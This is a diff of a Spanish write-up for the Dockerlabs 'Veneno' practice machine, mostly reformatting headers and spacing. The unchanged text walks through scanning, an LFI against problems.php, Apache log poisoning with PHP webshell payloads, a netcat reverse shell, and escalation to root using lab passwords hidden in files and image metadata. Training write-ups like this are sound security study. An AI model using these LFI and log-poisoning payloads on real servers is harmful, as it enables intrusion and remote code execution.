@@ -1,22 +1,30 @@
-# 🖥️ Writeup - Veneno 
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# Veneno ​​
+
+## 🖥️ Writeup - Veneno
+
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
 
 > **Tags:** `Linux` `Web` `PHP` `Gobuster` `Wfuzz` `LFI` `Log Poisoning` `RCE` `Find` `Exiftool` `Steganography`
 
-# INSTALACIÓN
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip veneno.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh veneno.tar
-``` 
+```
+
 Info:
 
 ```
@@ -41,23 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p22,80 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-09 15:57 +0100
 Nmap scan report for 172.17.0.2
@@ -82,7 +91,7 @@ Identificamos los puertos abiertos `22` (SSH) y `80` (HTTP).
 
 Accedemos a la máquina objetivo a través del puerto `80` (HTTP) y nos encontramos con una página de Apache por defecto.
 
-# GOBUSTER
+## GOBUSTER
 
 Realizamos `fuzzing` de directorios para intentar localizar directorios o archivos ocultos.
 
@@ -91,6 +100,7 @@ gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/D
 ```
 
 Info:
+
 ```
 ===============================================================
 Gobuster v3.8
@@ -118,7 +128,7 @@ También localizamos un archivo `problems.php` que, a primera vista, no revela n
 
 Sin embargo, decidimos comprobar si este archivo `.php` es vulnerable a `LFI`.
 
-# LFI
+## LFI
 
 Intentamos incluir el archivo local `/etc/passwd` a través de `problems.php`. Para ello, primero necesitamos `fuzzear` un parámetro que nos lo permita.
 
@@ -127,6 +137,7 @@ wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_dire
 ```
 
 Info:
+
 ```
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
@@ -148,10 +159,10 @@ Incluimos `/etc/passwd` utilizando el parámetro `backdoor`.
 
 ```
 http://172.17.0.2/problems.php?backdoor=../../../../etc/passwd
-``` 
-
+```
 
 Info:
+
 ```
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -190,13 +201,13 @@ Procedemos a investigar qué más archivos podemos incluir aprovechando la vulne
 http://172.17.0.2/problems.php?backdoor=../../../../var/log/apache2/error.log
 ```
 
-![alt text](../../images/errorlog.png)
+![alt text](../../.gitbook/assets/errorlog.png)
 
 Confirmamos que podemos visualizar el `error.log`.
 
-# LOG POISONING
+## LOG POISONING
 
-Tras identificar que el servidor refleja nuestras peticiones fallidas con `GOBUSTER` en el archivo `error.log`, el siguiente paso es intentar un `Log Poisoning`. 
+Tras identificar que el servidor refleja nuestras peticiones fallidas con `GOBUSTER` en el archivo `error.log`, el siguiente paso es intentar un `Log Poisoning`.
 
 Esta técnica consiste en envenenar el archivo de registro con código `PHP` malicioso para que, al ser incluido mediante el `LFI`, el servidor lo ejecute.
 
@@ -214,7 +225,7 @@ http://172.17.0.2/%3c%3fphp%20system('id');%20%3f%3e.php
 
 Al realizar esta petición, el servidor genera un error, ya que el archivo no existe, y guarda la entrada en `error.log`.
 
-![alt text](../../images/errorlogid.png)
+![alt text](../../.gitbook/assets/errorlogid.png)
 
 Como se observa en la captura, el servidor no solo nos muestra el error, sino que interpreta nuestra instrucción y nos devuelve el resultado del comando `id`.
 
@@ -224,9 +235,10 @@ Una vez confirmada la `RCE`, podemos optimizar el ataque inyectando una `webshel
 http://172.17.0.2/%3c%3fphp%20system($_GET['cmd']);%20%3f%3e.php
 ```
 
-Esto nos permitirá ejecutar cualquier comando simplemente añadiendo `&cmd=whoami` a la URL. 
+Esto nos permitirá ejecutar cualquier comando simplemente añadiendo `&cmd=whoami` a la URL.
 
 Ejemplo:
+
 ```
 http://172.17.0.2/problems.php?backdoor=../../../../../../../var/log/apache2/error.log&cmd=id
 ```
@@ -252,6 +264,7 @@ http://172.17.0.2/problems.php?backdoor=../../../../../../../var/log/apache2/err
 ```
 
 Info:
+
 ```
 listening on [any] 4444 ...
 connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 52758
@@ -264,28 +277,33 @@ www-data@ef25e2f8a7f6:/var/www/html$
 
 Al ejecutarse, recibimos la shell interactiva como el usuario `www-data`.
 
-# TTY
+## TTY
 
 Antes de buscar vectores de escalada de privilegios, vamos a hacer un tratamiento de TTY para tener una shell más interactiva, con los siguientes comandos:
 
 ```bash
 script /dev/null -c bash
 ```
+
 `ctrl Z`
+
 ```bash
 stty raw -echo; fg
 ```
+
 ```bash
 reset xterm
 ```
+
 ```bash
 export TERM=xterm
 ```
+
 ```bash
 export BASH=bash
 ```
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
 Una vez como el usuario `www-data`, enumeramos el directorio `/var/www/html` y encontramos un archivo llamado `antiguo_y_fuerte.txt`:
 
@@ -304,6 +322,7 @@ find /  -type f -mtime +8760 -print 2>/dev/null
 ```
 
 Info:
+
 ```
 /usr/share/viejuno/inhackeable_pass.txt
 ```
@@ -316,11 +335,12 @@ pinguinochocolatero
 
 Utilizamos esta credencial para autenticarnos y migrar al usuario `carlos`.
 
-```bash 
+```bash
 su carlos
 ```
 
 Info:
+
 ```
 carlos@ef25e2f8a7f6:/$ whoami
 carlos
@@ -357,6 +377,7 @@ find . 2>/dev/null
 ```
 
 Info:
+
 ```
 .
 ./.bashrc
@@ -381,7 +402,7 @@ Info:
 
 Comprobamos que la única carpeta que no está vacía es la 55, la cual contiene una imagen `.jpg`.
 
-Decidimos exfiltrar esta imagen a nuestra máquina atacante para analizarla. 
+Decidimos exfiltrar esta imagen a nuestra máquina atacante para analizarla.
 
 Para ello, levantamos un servidor `HTTP` con `Python3` en la máquina víctima y descargamos el archivo desde nuestra máquina.
 
@@ -400,6 +421,7 @@ exiftool .toor.jpg
 ```
 
 Info:
+
 ```
 ExifTool Version Number         : 13.44
 File Name                       : .toor.jpg
@@ -427,7 +449,6 @@ Image Size                      : 2048x2048
 Megapixels                      : 4.2
 ```
 
-
 Encontramos la contraseña de `root` oculta en el campo Image Quality: `pingui1730`.
 
 Finalmente, usamos esta contraseña para autenticarnos como `root`.
@@ -437,6 +458,7 @@ su root
 ```
 
 Info:
+
 ```
 root@ef25e2f8a7f6:/home/carlos/carpeta55# whoami
 root
